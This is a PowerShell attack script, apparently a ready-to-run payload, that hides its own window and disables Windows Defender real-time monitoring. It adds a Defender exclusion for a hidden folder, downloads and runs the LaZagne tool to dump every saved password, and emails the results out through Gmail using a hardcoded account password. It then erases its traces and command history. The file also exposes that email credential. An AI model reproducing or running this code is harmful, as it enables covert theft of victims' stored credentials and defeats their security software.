# Function from https://gist.github.com/lalibi/3762289efc5805f8cfcf (Hide Powershell Window)
function Set-WindowState {
    <#
    .LINK
    https://gist.github.com/Nora-Ballard/11240204
    #>

    [CmdletBinding(DefaultParameterSetName = 'InputObject')]
    param(
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
        [Object[]] $InputObject,

        [Parameter(Position = 1)]
        [ValidateSet('FORCEMINIMIZE', 'HIDE', 'MAXIMIZE', 'MINIMIZE', 'RESTORE',
                     'SHOW', 'SHOWDEFAULT', 'SHOWMAXIMIZED', 'SHOWMINIMIZED',
                     'SHOWMINNOACTIVE', 'SHOWNA', 'SHOWNOACTIVATE', 'SHOWNORMAL')]
        [string] $State = 'SHOW',
        [switch] $SuppressErrors = $false,
        [switch] $SetForegroundWindow = $false
    )

    Begin {
        $WindowStates = @{
        'FORCEMINIMIZE'         = 11
            'HIDE'              = 0
            'MAXIMIZE'          = 3
            'MINIMIZE'          = 6
            'RESTORE'           = 9
            'SHOW'              = 5
            'SHOWDEFAULT'       = 10
            'SHOWMAXIMIZED'     = 3
            'SHOWMINIMIZED'     = 2
            'SHOWMINNOACTIVE'   = 7
            'SHOWNA'            = 8
            'SHOWNOACTIVATE'    = 4
            'SHOWNORMAL'        = 1
        }

        $Win32ShowWindowAsync = Add-Type -MemberDefinition @'
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll", SetLastError = true)]
public static extern bool SetForegroundWindow(IntPtr hWnd);
'@ -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru

        if (!$global:MainWindowHandles) {
            $global:MainWindowHandles = @{ }
        }
    }

    Process {
        foreach ($process in $InputObject) {
            $handle = $process.MainWindowHandle

            if ($handle -eq 0 -and $global:MainWindowHandles.ContainsKey($process.Id)) {
                $handle = $global:MainWindowHandles[$process.Id]
            }

            if ($handle -eq 0) {
                if (-not $SuppressErrors) {
                    Write-Error "Main Window handle is '0'"
                }
                continue
            }

            $global:MainWindowHandles[$process.Id] = $handle

            $Win32ShowWindowAsync::ShowWindowAsync($handle, $WindowStates[$State]) | Out-Null
            if ($SetForegroundWindow) {
                $Win32ShowWindowAsync::SetForegroundWindow($handle) | Out-Null
            }

            Write-Verbose ("Set Window State '{1} on '{0}'" -f $MainWindowHandle, $State)
        }
    }
}

Set-Alias -Name 'Set-WindowStyle' -Value 'Set-WindowState'

# Disable real time protection
Set-MpPreference -DisableRealtimeMonitoring $true
# Minimize window 
Get-Process -ID $PID | Set-WindowState -State HIDE
# Create a tmp directory in the Downloads folder
$dir = "C:\Users\$env:UserName\Downloads\tmp"
New-Item -ItemType Directory -Path $dir
# Add an exception to Windows Defender for the tmp directory
Add-MpPreference -ExclusionPath $dir
#Hide the directory
$hide = Get-Item $dir -Force
$hide.attributes='Hidden'
# Download the executable
Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "$dir\lazagne.exe"
# Execute the executable and save output to a file
& "$dir\lazagne.exe" all > "$dir\output.txt"

# Exfiltrate the file
#POST REQUEST
#Invoke-WebRequest -Uri "http://IP:PORT0" -Method POST -Body Get-Content "$dir\output.txt"
# Mail Exfiltration
$EmailFrom = "herbertswindel@gmail.com"
$EmailTo = "herbertswindel@outlook.com"
$Subject = "Hier zijn uw gegevens kameraad!"
$Body = "Met vriendelijke groet, Herbert"
$SMTPServer = "smtp.gmail.com"

$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("herbertswindel@gmail.com", "isqn febe cwja vatn")

# Send the email with attachment
$Attachment = "$dir\output.txt"
$Message = New-Object Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body)
$Message.Attachments.Add($Attachment)

try {
    $SMTPClient.Send($Message)
    Write-Host "Email sent successfully."
} catch {
    Write-Host "Failed to send email. Error: $($_.Exception.Message)"
}

# Clean up
Remove-Item -Path $dir -Recurse -Force
Set-MpPreference -DisableRealtimeMonitoring $false
Remove-MpPreference -ExclusionPath $dir

# Remove the script from the system
Clear-History
